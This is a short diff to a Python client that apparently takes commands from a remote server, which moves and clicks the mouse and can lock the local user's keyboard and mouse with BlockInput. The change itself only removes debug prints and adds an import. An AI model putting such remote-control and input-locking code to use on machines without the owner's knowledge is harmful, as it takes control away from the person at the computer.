@@ -3,6 +3,7 @@ import mss.tools
 import requests
 from time import sleep
 from zlib import compress
+from sys import exit
 import psutil
 import threading
 import sqlite3
@@ -152,16 +153,11 @@ class ComputerAction:
             server_command = self.s.recv(RECV_DEFAULT)
             try:
                 pos = json.loads(server_command.decode())
-                print(pos)
                 pos_x = int(float(pos[0]))
                 pos_y = int(float(pos[1]))
-                print("before calling")
-                print(pos_x)
-                print(pos_y)
                 self.click(pos_x, pos_y)
             except:
                 lock_or_not = server_command.decode()
-                print(lock_or_not)
                 if lock_or_not == "Lock": # only works if the client is activated in administrator mode
                     windll.user32.BlockInput(True)
                 else:
